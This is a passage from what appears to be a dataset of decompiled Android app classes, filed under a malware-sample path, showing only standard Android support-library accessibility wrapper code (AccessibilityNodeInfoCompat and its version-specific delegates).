AccessibilityNodeInfoStubImpl(){     }     @Override public Object obtain(){       return null;     }     @Override public Object obtain(    View source){       return null;     }     @Override public Object obtain(    View root,    int virtualDescendantId){       return null;     }     @Override public Object obtain(    Object info){       return null;     }     @Override public void addAction(    Object info,    int action){     }     @Override public void addChild(    Object info,    View child){     }     @Override public void addChild(    Object info,    View child,    int virtualDescendantId){     }     @Override public List<Object> findAccessibilityNodeInfosByText(    Object info,    String text){       return Collections.emptyList();     }     @Override public int getActions(    Object info){       return 0;     }     @Override public void getBoundsInParent(    Object info,    Rect outBounds){     }     @Override public void getBoundsInScreen(    Object info,    Rect outBounds){     }     @Override public Object getChild(    Object info,    int index){       return null;     }     @Override public int getChildCount(    Object info){       return 0;     }     @Override public CharSequence getClassName(    Object info){       return null;     }     @Override public CharSequence getContentDescription(    Object info){       return null;     }     @Override public CharSequence getPackageName(    Object info){       return null;     }     @Override public Object getParent(    Object info){       return null;     }     @Override public CharSequence getText(    Object info){       return null;     }     @Override public int getWindowId(    Object info){       return 0;     }     @Override public boolean isCheckable(    Object info){       return false;     }     @Override public boolean isChecked(    Object info){       return false;     }     @Override public boolean isClickable(    Object info){       return false;     }     @Override public boolean isEnabled(    Object info){       return false;     }     @Override public boolean isFocusable(    Object info){       return false;     }     @Override public boolean isFocused(    Object info){       return false;     }     @Override public boolean isVisibleToUser(    Object info){       return false;     }     @Override public boolean isAccessibilityFocused(    Object info){       return false;     }     @Override public boolean isLongClickable(    Object info){       return false;     }     @Override public boolean isPassword(    Object info){       return false;     }     @Override public boolean isScrollable(    Object info){       return false;     }     @Override public boolean isSelected(    Object info){       return false;     }     @Override public boolean performAction(    Object info,    int action){       return false;     }     @Override public boolean performAction(    Object info,    int action,    Bundle arguments){       return false;     }     @Override public void setMovementGranularities(    Object info,    int granularities){     }     @Override public int getMovementGranularities(    Object info){       return 0;     }     @Override public void setBoundsInParent(    Object info,    Rect bounds){     }     @Override public void setBoundsInScreen(    Object info,    Rect bounds){     }     @Override public void setCheckable(    Object info,    boolean checkable){     }     @Override public void setChecked(    Object info,    boolean checked){     }     @Override public void setClassName(    Object info,    CharSequence className){     }     @Override public void setClickable(    Object info,    boolean clickable){     }     @Override public void setContentDescription(    Object info,    CharSequence contentDescription){     }     @Override public void setEnabled(    Object info,    boolean enabled){     }     @Override public void setFocusable(    Object info,    boolean focusable){     }     @Override public void setFocused(    Object info,    boolean focused){     }     @Override public void setVisibleToUser(    Object info,    boolean visibleToUser){     }     @Override public void setAccessibilityFocused(    Object info,    boolean focused){     }     @Override public void setLongClickable(    Object info,    boolean longClickable){     }     @Override public void setPackageName(    Object info,    CharSequence packageName){     }     @Override public void setParent(    Object info,    View parent){     }     @Override public void setPassword(    Object info,    boolean password){     }     @Override public void setScrollable(    Object info,    boolean scrollable){     }     @Override public void setSelected(    Object info,    boolean selected){     }     @Override public void setSource(    Object info,    View source){     }     @Override public void setSource(    Object info,    View root,    int virtualDescendantId){     }     @Override public Object findFocus(    Object info,    int focus){       return null;     }     @Override public Object focusSearch(    Object info,    int direction){       return null;     }     @Override public void setText(    Object info,    CharSequence text){     }     @Override public void recycle(    Object info){     }     @Override public void setParent(    Object info,    View root,    int virtualDescendantId){     }   } static class AccessibilityNodeInfoIcsImpl extends AccessibilityNodeInfoStubImpl {     AccessibilityNodeInfoIcsImpl(){     }     @Override public Object obtain(){       return AccessibilityNodeInfoCompatIcs.obtain();     }     @Override public Object obtain(    View source){       return AccessibilityNodeInfoCompatIcs.obtain(source);     }     @Override public Object obtain(    Object info){       return AccessibilityNodeInfoCompatIcs.obtain(info);     }     @Override public void addAction(    Object info,    int action){       AccessibilityNodeInfoCompatIcs.addAction(info,action);     }     @Override public void addChild(    Object info,    View child){       AccessibilityNodeInfoCompatIcs.addChild(info,child);     }     @Override public List<Object> findAccessibilityNodeInfosByText(    Object info,    String text){       return AccessibilityNodeInfoCompatIcs.findAccessibilityNodeInfosByText(info,text);     }     @Override public int getActions(    Object info){       return AccessibilityNodeInfoCompatIcs.getActions(info);     }     @Override public void getBoundsInParent(    Object info,    Rect outBounds){       AccessibilityNodeInfoCompatIcs.getBoundsInParent(info,outBounds);     }     @Override public void getBoundsInScreen(    Object info,    Rect outBounds){       AccessibilityNodeInfoCompatIcs.getBoundsInScreen(info,outBounds);     }     @Override public Object getChild(    Object info,    int index){       return AccessibilityNodeInfoCompatIcs.getChild(info,index);     }     @Override public int getChildCount(    Object info){       return AccessibilityNodeInfoCompatIcs.getChildCount(info);     }     @Override public CharSequence getClassName(    Object info){       return AccessibilityNodeInfoCompatIcs.getClassName(info);     }     @Override public CharSequence getContentDescription(    Object info){       return AccessibilityNodeInfoCompatIcs.getContentDescription(info);     }     @Override public CharSequence getPackageName(    Object info){       return AccessibilityNodeInfoCompatIcs.getPackageName(info);     }     @Override public Object getParent(    Object info){       return AccessibilityNodeInfoCompatIcs.getParent(info);     }     @Override public CharSequence getText(    Object info){       return AccessibilityNodeInfoCompatIcs.getText(info);     }     @Override public int getWindowId(    Object info){       return AccessibilityNodeInfoCompatIcs.getWindowId(info);     }     @Override public boolean isCheckable(    Object info){       return AccessibilityNodeInfoCompatIcs.isCheckable(info);     }     @Override public boolean isChecked(    Object info){       return AccessibilityNodeInfoCompatIcs.isChecked(info);     }     @Override public boolean isClickable(    Object info){       return AccessibilityNodeInfoCompatIcs.isClickable(info);     }     @Override public boolean isEnabled(    Object info){       return AccessibilityNodeInfoCompatIcs.isEnabled(info);     }     @Override public boolean isFocusable(    Object info){       return AccessibilityNodeInfoCompatIcs.isFocusable(info);     }     @Override public boolean isFocused(    Object info){       return AccessibilityNodeInfoCompatIcs.isFocused(info);     }     @Override public boolean isLongClickable(    Object info){       return AccessibilityNodeInfoCompatIcs.isLongClickable(info);     }     @Override public boolean isPassword(    Object info){       return AccessibilityNodeInfoCompatIcs.isPassword(info);     }     @Override public boolean isScrollable(    Object info){       return AccessibilityNodeInfoCompatIcs.isScrollable(info);     }     @Override public boolean isSelected(    Object info){       return AccessibilityNodeInfoCompatIcs.isSelected(info);     }     @Override public boolean performAction(    Object info,    int action){       return AccessibilityNodeInfoCompatIcs.performAction(info,action);     }     @Override public void setBoundsInParent(    Object info,    Rect bounds){       AccessibilityNodeInfoCompatIcs.setBoundsInParent(info,bounds);     }     @Override public void setBoundsInScreen(    Object info,    Rect bounds){       AccessibilityNodeInfoCompatIcs.setBoundsInScreen(info,bounds);     }     @Override public void setCheckable(    Object info,    boolean checkable){       AccessibilityNodeInfoCompatIcs.setCheckable(info,checkable);     }     @Override public void setChecked(    Object info,    boolean checked){       AccessibilityNodeInfoCompatIcs.setChecked(info,checked);     }     @Override public void setClassName(    Object info,    CharSequence className){       AccessibilityNodeInfoCompatIcs.setClassName(info,className);     }     @Override public void setClickable(    Object info,    boolean clickable){       AccessibilityNodeInfoCompatIcs.setClickable(info,clickable);     }     @Override public void setContentDescription(    Object info,    CharSequence contentDescription){       AccessibilityNodeInfoCompatIcs.setContentDescription(info,contentDescription);     }     @Override public void setEnabled(    Object info,    boolean enabled){       AccessibilityNodeInfoCompatIcs.setEnabled(info,enabled);     }     @Override public void setFocusable(    Object info,    boolean focusable){       AccessibilityNodeInfoCompatIcs.setFocusable(info,focusable);     }     @Override public void setFocused(    Object info,    boolean focused){       AccessibilityNodeInfoCompatIcs.setFocused(info,focused);     }     @Override public void setLongClickable(    Object info,    boolean longClickable){       AccessibilityNodeInfoCompatIcs.setLongClickable(info,longClickable);     }     @Override public void setPackageName(    Object info,    CharSequence packageName){       AccessibilityNodeInfoCompatIcs.setPackageName(info,packageName);     }     @Override public void setParent(    Object info,    View parent){       AccessibilityNodeInfoCompatIcs.setParent(info,parent);     }     @Override public void setPassword(    Object info,    boolean password){       AccessibilityNodeInfoCompatIcs.setPassword(info,password);     }     @Override public void setScrollable(    Object info,    boolean scrollable){       AccessibilityNodeInfoCompatIcs.setScrollable(info,scrollable);     }     @Override public void setSelected(    Object info,    boolean selected){       AccessibilityNodeInfoCompatIcs.setSelected(info,selected);     }     @Override public void setSource(    Object info,    View source){       AccessibilityNodeInfoCompatIcs.setSource(info,source);     }     @Override public void setText(    Object info,    CharSequence text){       AccessibilityNodeInfoCompatIcs.setText(info,text);     }     @Override public void recycle(    Object info){       AccessibilityNodeInfoCompatIcs.recycle(info);     }   } static class AccessibilityNodeInfoJellybeanImpl extends AccessibilityNodeInfoIcsImpl {     AccessibilityNodeInfoJellybeanImpl(){     }     @Override public Object obtain(    View root,    int virtualDescendantId){       return AccessibilityNodeInfoCompatJellyBean.obtain(root,virtualDescendantId);     }     @Override public Object findFocus(    Object info,    int focus){       return AccessibilityNodeInfoCompatJellyBean.findFocus(info,focus);     }     @Override public Object focusSearch(    Object info,    int direction){       return AccessibilityNodeInfoCompatJellyBean.focusSearch(info,direction);     }     @Override public void addChild(    Object info,    View child,    int virtualDescendantId){       AccessibilityNodeInfoCompatJellyBean.addChild(info,child,virtualDescendantId);     }     @Override public void setSource(    Object info,    View root,    int virtualDescendantId){       AccessibilityNodeInfoCompatJellyBean.setSource(info,root,virtualDescendantId);     }     @Override public boolean isVisibleToUser(    Object info){       return AccessibilityNodeInfoCompatJellyBean.isVisibleToUser(info);     }     @Override public void setVisibleToUser(    Object info,    boolean visibleToUser){       AccessibilityNodeInfoCompatJellyBean.setVisibleToUser(info,visibleToUser);     }     @Override public boolean isAccessibilityFocused(    Object info){       return AccessibilityNodeInfoCompatJellyBean.isAccessibilityFocused(info);     }     @Override public void setAccessibilityFocused(    Object info,    boolean focused){       AccessibilityNodeInfoCompatJellyBean.setAccesibilityFocused(info,focused);     }     @Override public boolean performAction(    Object info,    int action,    Bundle arguments){       return AccessibilityNodeInfoCompatJellyBean.performAction(info,action,arguments);     }     @Override public void setMovementGranularities(    Object info,    int granularities){       AccessibilityNodeInfoCompatJellyBean.setMovementGranularities(info,granularities);     }     @Override public int getMovementGranularities(    Object info){       return AccessibilityNodeInfoCompatJellyBean.getMovementGranularities(info);     }     @Override public void setParent(    Object info,    View root,    int virtualDescendantId){       AccessibilityNodeInfoCompatJellyBean.setParent(info,root,virtualDescendantId);     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new AccessibilityNodeInfoJellybeanImpl();     }  else     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new AccessibilityNodeInfoIcsImpl();     }  else {       IMPL=new AccessibilityNodeInfoStubImpl();     }   }   public static AccessibilityNodeInfoCompat wrapNonNullInstance(  Object object){     if (object != null) {       return new AccessibilityNodeInfoCompat(object);     }     return null;   }   public AccessibilityNodeInfoCompat(  Object info){     this.mInfo=info;   }   public Object getInfo(){     return this.mInfo;   }   public static AccessibilityNodeInfoCompat obtain(  View source){     return wrapNonNullInstance(IMPL.obtain(source));   }   public static AccessibilityNodeInfoCompat obtain(  View root,  int virtualDescendantId){     return wrapNonNullInstance(IMPL.obtain(root,virtualDescendantId));   }   public static AccessibilityNodeInfoCompat obtain(){     return wrapNonNullInstance(IMPL.obtain());   }   public static AccessibilityNodeInfoCompat obtain(  AccessibilityNodeInfoCompat info){     return wrapNonNullInstance(IMPL.obtain(info.mInfo));   }   public void setSource(  View source){     IMPL.setSource(this.mInfo,source);   }   public void setSource(  View root,  int virtualDescendantId){     IMPL.setSource(this.mInfo,root,virtualDescendantId);   }   public AccessibilityNodeInfoCompat findFocus(  int focus){     return wrapNonNullInstance(IMPL.findFocus(this.mInfo,focus));   }   public AccessibilityNodeInfoCompat focusSearch(  int direction){     return wrapNonNullInstance(IMPL.focusSearch(this.mInfo,direction));   }   public int getWindowId(){     return IMPL.getWindowId(this.mInfo);   }   public int getChildCount(){     return IMPL.getChildCount(this.mInfo);   }   public AccessibilityNodeInfoCompat getChild(  int index){     return wrapNonNullInstance(IMPL.getChild(this.mInfo,index));   }   public void addChild(  View child){     IMPL.addChild(this.mInfo,child);   }   public void addChild(  View root,  int virtualDescendantId){     IMPL.addChild(this.mInfo,root,virtualDescendantId);   }   public int getActions(){     return IMPL.getActions(this.mInfo);   }   public void addAction(  int action){     IMPL.addAction(this.mInfo,action);   }   public boolean performAction(  int action){     return IMPL.performAction(this.mInfo,action);   }   public boolean performAction(  int action,  Bundle arguments){     return IMPL.performAction(this.mInfo,action,arguments);   }   public void setMovementGranularities(  int granularities){     IMPL.setMovementGranularities(this.mInfo,granularities);   }   public int getMovementGranularities(){     return IMPL.getMovementGranularities(this.mInfo);   }   public List<AccessibilityNodeInfoCompat> findAccessibilityNodeInfosByText(  String text){     List<AccessibilityNodeInfoCompat> result=new ArrayList<>();     List<Object> infos=IMPL.findAccessibilityNodeInfosByText(this.mInfo,text);     int infoCount=infos.size();     for (int i=0; i < infoCount; i++) {       Object info=infos.get(i);       result.add(new AccessibilityNodeInfoCompat(info));     }     return result;   }   public AccessibilityNodeInfoCompat getParent(){     return wrapNonNullInstance(IMPL.getParent(this.mInfo));   }   public void setParent(  View parent){     IMPL.setParent(this.mInfo,parent);   }   public void setParent(  View root,  int virtualDescendantId){     IMPL.setParent(this.mInfo,root,virtualDescendantId);   }   public void getBoundsInParent(  Rect outBounds){     IMPL.getBoundsInParent(this.mInfo,outBounds);   }   public void setBoundsInParent(  Rect bounds){     IMPL.setBoundsInParent(this.mInfo,bounds);   }   public void getBoundsInScreen(  Rect outBounds){     IMPL.getBoundsInScreen(this.mInfo,outBounds);   }   public void setBoundsInScreen(  Rect bounds){     IMPL.setBoundsInScreen(this.mInfo,bounds);   }   public boolean isCheckable(){     return IMPL.isCheckable(this.mInfo);   }   public void setCheckable(  boolean checkable){     IMPL.setCheckable(this.mInfo,checkable);   }   public boolean isChecked(){     return IMPL.isChecked(this.mInfo);   }   public void setChecked(  boolean checked){     IMPL.setChecked(this.mInfo,checked);   }   public boolean isFocusable(){     return IMPL.isFocusable(this.mInfo);   }   public void setFocusable(  boolean focusable){     IMPL.setFocusable(this.mInfo,focusable);   }   public boolean isFocused(){     return IMPL.isFocused(this.mInfo);   }   public void setFocused(  boolean focused){     IMPL.setFocused(this.mInfo,focused);   }   public boolean isVisibleToUser(){     return IMPL.isVisibleToUser(this.mInfo);   }   public void setVisibleToUser(  boolean visibleToUser){     IMPL.setVisibleToUser(this.mInfo,visibleToUser);   }   public boolean isAccessibilityFocused(){     return IMPL.isAccessibilityFocused(this.mInfo);   }   public void setAccessibilityFocused(  boolean focused){     IMPL.setAccessibilityFocused(this.mInfo,focused);   }   public boolean isSelected(){     return IMPL.isSelected(this.mInfo);   }   public void setSelected(  boolean selected){     IMPL.setSelected(this.mInfo,selected);   }   public boolean isClickable(){     return IMPL.isClickable(this.mInfo);   }   public void setClickable(  boolean clickable){     IMPL.setClickable(this.mInfo,clickable);   }   public boolean isLongClickable(){     return IMPL.isLongClickable(this.mInfo);   }   public void setLongClickable(  boolean longClickable){     IMPL.setLongClickable(this.mInfo,longClickable);   }   public boolean isEnabled(){     return IMPL.isEnabled(this.mInfo);   }   public void setEnabled(  boolean enabled){     IMPL.setEnabled(this.mInfo,enabled);   }   public boolean isPassword(){     return IMPL.isPassword(this.mInfo);   }   public void setPassword(  boolean password){     IMPL.setPassword(this.mInfo,password);   }   public boolean isScrollable(){     return IMPL.isScrollable(this.mInfo);   }   public void setScrollable(  boolean scrollable){     IMPL.setScrollable(this.mInfo,scrollable);   }   public CharSequence getPackageName(){     return IMPL.getPackageName(this.mInfo);   }   public void setPackageName(  CharSequence packageName){     IMPL.setPackageName(this.mInfo,packageName);   }   public CharSequence getClassName(){     return IMPL.getClassName(this.mInfo);   }   public void setClassName(  CharSequence className){     IMPL.setClassName(this.mInfo,className);   }   public CharSequence getText(){     return IMPL.getText(this.mInfo);   }   public void setText(  CharSequence text){     IMPL.setText(this.mInfo,text);   }   public CharSequence getContentDescription(){     return IMPL.getContentDescription(this.mInfo);   }   public void setContentDescription(  CharSequence contentDescription){     IMPL.setContentDescription(this.mInfo,contentDescription);   }   public void recycle(){     IMPL.recycle(this.mInfo);   }   public int hashCode(){     if (this.mInfo == null) {       return 0;     }     return this.mInfo.hashCode();   }   public boolean equals(  Object obj){     if (this == obj) {       return true;     }     if (obj != null && getClass() == obj.getClass()) {       AccessibilityNodeInfoCompat other=(AccessibilityNodeInfoCompat)obj;       return this.mInfo == null ? other.mInfo == null : this.mInfo.equals(other.mInfo);     }     return false;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityNodeInfoCompatIcs.code","class AccessibilityNodeInfoCompatIcs {   AccessibilityNodeInfoCompatIcs(){   }   public static Object obtain(){     return AccessibilityNodeInfo.obtain();   }   public static Object obtain(  View source){     return AccessibilityNodeInfo.obtain(source);   }   public static Object obtain(  Object info){     return AccessibilityNodeInfo.obtain((AccessibilityNodeInfo)info);   }   public static void addAction(  Object info,  int action){     ((AccessibilityNodeInfo)info).addAction(action);   }   public static void addChild(  Object info,  View child){     ((AccessibilityNodeInfo)info).addChild(child);   }   public static List<Object> findAccessibilityNodeInfosByText(  Object info,  String text){     List result=((AccessibilityNodeInfo)info).findAccessibilityNodeInfosByText(text);     return result;   }   public static int getActions(  Object info){     return ((AccessibilityNodeInfo)info).getActions();   }   public static void getBoundsInParent(  Object info,  Rect outBounds){     ((AccessibilityNodeInfo)info).getBoundsInParent(outBounds);   }   public static void getBoundsInScreen(  Object info,  Rect outBounds){     ((AccessibilityNodeInfo)info).getBoundsInScreen(outBounds);   }   public static Object getChild(  Object info,  int index){     return ((AccessibilityNodeInfo)info).getChild(index);   }   public static int getChildCount(  Object info){     return ((AccessibilityNodeInfo)info).getChildCount();   }   public static CharSequence getClassName(  Object info){     return ((AccessibilityNodeInfo)info).getClassName();   }   public static CharSequence getContentDescription(  Object info){     return ((AccessibilityNodeInfo)info).getContentDescription();   }   public static CharSequence getPackageName(  Object info){     return ((AccessibilityNodeInfo)info).getPackageName();   }   public static Object getParent(  Object info){     return ((AccessibilityNodeInfo)info).getParent();   }   public static CharSequence getText(  Object info){     return ((AccessibilityNodeInfo)info).getText();   }   public static int getWindowId(  Object info){     return ((AccessibilityNodeInfo)info).getWindowId();   }   public static boolean isCheckable(  Object info){     return ((AccessibilityNodeInfo)info).isCheckable();   }   public static boolean isChecked(  Object info){     return ((AccessibilityNodeInfo)info).isChecked();   }   public static boolean isClickable(  Object info){     return ((AccessibilityNodeInfo)info).isClickable();   }   public static boolean isEnabled(  Object info){     return ((AccessibilityNodeInfo)info).isEnabled();   }   public static boolean isFocusable(  Object info){     return ((AccessibilityNodeInfo)info).isFocusable();   }   public static boolean isFocused(  Object info){     return ((AccessibilityNodeInfo)info).isFocused();   }   public static boolean isLongClickable(  Object info){     return ((AccessibilityNodeInfo)info).isLongClickable();   }   public static boolean isPassword(  Object info){     return ((AccessibilityNodeInfo)info).isPassword();   }   public static boolean isScrollable(  Object info){     return ((AccessibilityNodeInfo)info).isScrollable();   }   public static boolean isSelected(  Object info){     return ((AccessibilityNodeInfo)info).isSelected();   }   public static boolean performAction(  Object info,  int action){     return ((AccessibilityNodeInfo)info).performAction(action);   }   public static void setBoundsInParent(  Object info,  Rect bounds){     ((AccessibilityNodeInfo)info).setBoundsInParent(bounds);   }   public static void setBoundsInScreen(  Object info,  Rect bounds){     ((AccessibilityNodeInfo)info).setBoundsInScreen(bounds);   }   public static void setCheckable(  Object info,  boolean checkable){     ((AccessibilityNodeInfo)info).setCheckable(checkable);   }   public static void setChecked(  Object info,  boolean checked){     ((AccessibilityNodeInfo)info).setChecked(checked);   }   public static void setClassName(  Object info,  CharSequence className){     ((AccessibilityNodeInfo)info).setClassName(className);   }   public static void setClickable(  Object info,  boolean clickable){     ((AccessibilityNodeInfo)info).setClickable(clickable);   }   public static void setContentDescription(  Object info,  CharSequence contentDescription){     ((AccessibilityNodeInfo)info).setContentDescription(contentDescription);   }   public static void setEnabled(  Object info,  boolean enabled){     ((AccessibilityNodeInfo)info).setEnabled(enabled);   }   public static void setFocusable(  Object info,  boolean focusable){     ((AccessibilityNodeInfo)info).setFocusable(focusable);   }   public static void setFocused(  Object info,  boolean focused){     ((AccessibilityNodeInfo)info).setFocused(focused);   }   public static void setLongClickable(  Object info,  boolean longClickable){     ((AccessibilityNodeInfo)info).setLongClickable(longClickable);   }   public static void setPackageName(  Object info,  CharSequence packageName){     ((AccessibilityNodeInfo)info).setPackageName(packageName);   }   public static void setParent(  Object info,  View parent){     ((AccessibilityNodeInfo)info).setParent(parent);   }   public static void setPassword(  Object info,  boolean password){     ((AccessibilityNodeInfo)info).setPassword(password);   }   public static void setScrollable(  Object info,  boolean scrollable){     ((AccessibilityNodeInfo)info).setScrollable(scrollable);   }   public static void setSelected(  Object info,  boolean selected){     ((AccessibilityNodeInfo)info).setSelected(selected);   }   public static void setSource(  Object info,  View source){     ((AccessibilityNodeInfo)info).setSource(source);   }   public static void setText(  Object info,  CharSequence text){     ((AccessibilityNodeInfo)info).setText(text);   }   public static void recycle(  Object info){     ((AccessibilityNodeInfo)info).recycle();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityNodeInfoCompatJellyBean.code","class AccessibilityNodeInfoCompatJellyBean {   AccessibilityNodeInfoCompatJellyBean(){   }   public static void addChild(  Object info,  View child,  int virtualDescendantId){     ((AccessibilityNodeInfo)info).addChild(child,virtualDescendantId);   }   public static void setSource(  Object info,  View root,  int virtualDescendantId){     ((AccessibilityNodeInfo)info).setSource(root,virtualDescendantId);   }   public static boolean isVisibleToUser(  Object info){     return ((AccessibilityNodeInfo)info).isVisibleToUser();   }   public static void setVisibleToUser(  Object info,  boolean visibleToUser){     ((AccessibilityNodeInfo)info).setVisibleToUser(visibleToUser);   }   public static boolean performAction(  Object info,  int action,  Bundle arguments){     return ((AccessibilityNodeInfo)info).performAction(action,arguments);   }   public static void setMovementGranularities(  Object info,  int granularities){     ((AccessibilityNodeInfo)info).setMovementGranularities(granularities);   }   public static int getMovementGranularities(  Object info){     return ((AccessibilityNodeInfo)info).getMovementGranularities();   }   public static Object obtain(  View root,  int virtualDescendantId){     return AccessibilityNodeInfo.obtain(root,virtualDescendantId);   }   public static Object findFocus(  Object info,  int focus){     return ((AccessibilityNodeInfo)info).findFocus(focus);   }   public static Object focusSearch(  Object info,  int direction){     return ((AccessibilityNodeInfo)info).focusSearch(direction);   }   public static void setParent(  Object info,  View root,  int virtualDescendantId){     ((AccessibilityNodeInfo)info).setParent(root,virtualDescendantId);   }   public static boolean isAccessibilityFocused(  Object info){     return ((AccessibilityNodeInfo)info).isAccessibilityFocused();   }   public static void setAccesibilityFocused(  Object info,  boolean focused){     ((AccessibilityNodeInfo)info).setAccessibilityFocused(focused);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityNodeInfoIcsImpl.code","static class AccessibilityNodeInfoIcsImpl extends AccessibilityNodeInfoStubImpl {   AccessibilityNodeInfoIcsImpl(){   }   @Override public Object obtain(){     return AccessibilityNodeInfoCompatIcs.obtain();   }   @Override public Object obtain(  View source){     return AccessibilityNodeInfoCompatIcs.obtain(source);   }   @Override public Object obtain(  Object info){     return AccessibilityNodeInfoCompatIcs.obtain(info);   }   @Override public void addAction(  Object info,  int action){     AccessibilityNodeInfoCompatIcs.addAction(info,action);   }   @Override public void addChild(  Object info,  View child){     AccessibilityNodeInfoCompatIcs.addChild(info,child);   }   @Override public List<Object> findAccessibilityNodeInfosByText(  Object info,  String text){     return AccessibilityNodeInfoCompatIcs.findAccessibilityNodeInfosByText(info,text);   }   @Override public int getActions(  Object info){     return AccessibilityNodeInfoCompatIcs.getActions(info);   }   @Override public void getBoundsInParent(  Object info,  Rect outBounds){     AccessibilityNodeInfoCompatIcs.getBoundsInParent(info,outBounds);   }   @Override public void getBoundsInScreen(  Object info,  Rect outBounds){     AccessibilityNodeInfoCompatIcs.getBoundsInScreen(info,outBounds);   }   @Override public Object getChild(  Object info,  int index){     return AccessibilityNodeInfoCompatIcs.getChild(info,index);   }   @Override public int getChildCount(  Object info){     return AccessibilityNodeInfoCompatIcs.getChildCount(info);   }   @Override public CharSequence getClassName(  Object info){     return AccessibilityNodeInfoCompatIcs.getClassName(info);   }   @Override public CharSequence getContentDescription(  Object info){     return AccessibilityNodeInfoCompatIcs.getContentDescription(info);   }   @Override public CharSequence getPackageName(  Object info){     return AccessibilityNodeInfoCompatIcs.getPackageName(info);   }   @Override public Object getParent(  Object info){     return AccessibilityNodeInfoCompatIcs.getParent(info);   }   @Override public CharSequence getText(  Object info){     return AccessibilityNodeInfoCompatIcs.getText(info);   }   @Override public int getWindowId(  Object info){     return AccessibilityNodeInfoCompatIcs.getWindowId(info);   }   @Override public boolean isCheckable(  Object info){     return AccessibilityNodeInfoCompatIcs.isCheckable(info);   }   @Override public boolean isChecked(  Object info){     return AccessibilityNodeInfoCompatIcs.isChecked(info);   }   @Override public boolean isClickable(  Object info){     return AccessibilityNodeInfoCompatIcs.isClickable(info);   }   @Override public boolean isEnabled(  Object info){     return AccessibilityNodeInfoCompatIcs.isEnabled(info);   }   @Override public boolean isFocusable(  Object info){     return AccessibilityNodeInfoCompatIcs.isFocusable(info);   }   @Override public boolean isFocused(  Object info){     return AccessibilityNodeInfoCompatIcs.isFocused(info);   }   @Override public boolean isLongClickable(  Object info){     return AccessibilityNodeInfoCompatIcs.isLongClickable(info);   }   @Override public boolean isPassword(  Object info){     return AccessibilityNodeInfoCompatIcs.isPassword(info);   }   @Override public boolean isScrollable(  Object info){     return AccessibilityNodeInfoCompatIcs.isScrollable(info);   }   @Override public boolean isSelected(  Object info){     return AccessibilityNodeInfoCompatIcs.isSelected(info);   }   @Override public boolean performAction(  Object info,  int action){     return AccessibilityNodeInfoCompatIcs.performAction(info,action);   }   @Override public void setBoundsInParent(  Object info,  Rect bounds){     AccessibilityNodeInfoCompatIcs.setBoundsInParent(info,bounds);   }   @Override public void setBoundsInScreen(  Object info,  Rect bounds){     AccessibilityNodeInfoCompatIcs.setBoundsInScreen(info,bounds);   }   @Override public void setCheckable(  Object info,  boolean checkable){     AccessibilityNodeInfoCompatIcs.setCheckable(info,checkable);   }   @Override public void setChecked(  Object info,  boolean checked){     AccessibilityNodeInfoCompatIcs.setChecked(info,checked);   }   @Override public void setClassName(  Object info,  CharSequence className){     AccessibilityNodeInfoCompatIcs.setClassName(info,className);   }   @Override public void setClickable(  Object info,  boolean clickable){     AccessibilityNodeInfoCompatIcs.setClickable(info,clickable);   }   @Override public void setContentDescription(  Object info,  CharSequence contentDescription){     AccessibilityNodeInfoCompatIcs.setContentDescription(info,contentDescription);   }   @Override public void setEnabled(  Object info,  boolean enabled){     AccessibilityNodeInfoCompatIcs.setEnabled(info,enabled);   }   @Override public void setFocusable(  Object info,  boolean focusable){     AccessibilityNodeInfoCompatIcs.setFocusable(info,focusable);   }   @Override public void setFocused(  Object info,  boolean focused){     AccessibilityNodeInfoCompatIcs.setFocused(info,focused);   }   @Override public void setLongClickable(  Object info,  boolean longClickable){     AccessibilityNodeInfoCompatIcs.setLongClickable(info,longClickable);   }   @Override public void setPackageName(  Object info,  CharSequence packageName){     AccessibilityNodeInfoCompatIcs.setPackageName(info,packageName);   }   @Override public void setParent(  Object info,  View parent){     AccessibilityNodeInfoCompatIcs.setParent(info,parent);   }   @Override public void setPassword(  Object info,  boolean password){     AccessibilityNodeInfoCompatIcs.setPassword(info,password);   }   @Override public void setScrollable(  Object info,  boolean scrollable){     AccessibilityNodeInfoCompatIcs.setScrollable(info,scrollable);   }   @Override public void setSelected(  Object info,  boolean selected){     AccessibilityNodeInfoCompatIcs.setSelected(info,selected);   }   @Override public void setSource(  Object info,  View source){     AccessibilityNodeInfoCompatIcs.setSource(info,source);   }   @Override public void setText(  Object info,  CharSequence text){     AccessibilityNodeInfoCompatIcs.setText(info,text);   }   @Override public void recycle(  Object info){     AccessibilityNodeInfoCompatIcs.recycle(info);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityNodeInfoImpl.code","interface AccessibilityNodeInfoImpl {   void addAction(  Object obj,  int i);   void addChild(  Object obj,  View view);   void addChild(  Object obj,  View view,  int i);   List<Object> findAccessibilityNodeInfosByText(  Object obj,  String str);   Object findFocus(  Object obj,  int i);   Object focusSearch(  Object obj,  int i);   int getActions(  Object obj);   void getBoundsInParent(  Object obj,  Rect rect);   void getBoundsInScreen(  Object obj,  Rect rect);   Object getChild(  Object obj,  int i);   int getChildCount(  Object obj);   CharSequence getClassName(  Object obj);   CharSequence getContentDescription(  Object obj);   int getMovementGranularities(  Object obj);   CharSequence getPackageName(  Object obj);   Object getParent(  Object obj);   CharSequence getText(  Object obj);   int getWindowId(  Object obj);   boolean isAccessibilityFocused(  Object obj);   boolean isCheckable(  Object obj);   boolean isChecked(  Object obj);   boolean isClickable(  Object obj);   boolean isEnabled(  Object obj);   boolean isFocusable(  Object obj);   boolean isFocused(  Object obj);   boolean isLongClickable(  Object obj);   boolean isPassword(  Object obj);   boolean isScrollable(  Object obj);   boolean isSelected(  Object obj);   boolean isVisibleToUser(  Object obj);   Object obtain();   Object obtain(  View view);   Object obtain(  View view,  int i);   Object obtain(  Object obj);   boolean performAction(  Object obj,  int i);   boolean performAction(  Object obj,  int i,  Bundle bundle);   void recycle(  Object obj);   void setAccessibilityFocused(  Object obj,  boolean z);   void setBoundsInParent(  Object obj,  Rect rect);   void setBoundsInScreen(  Object obj,  Rect rect);   void setCheckable(  Object obj,  boolean z);   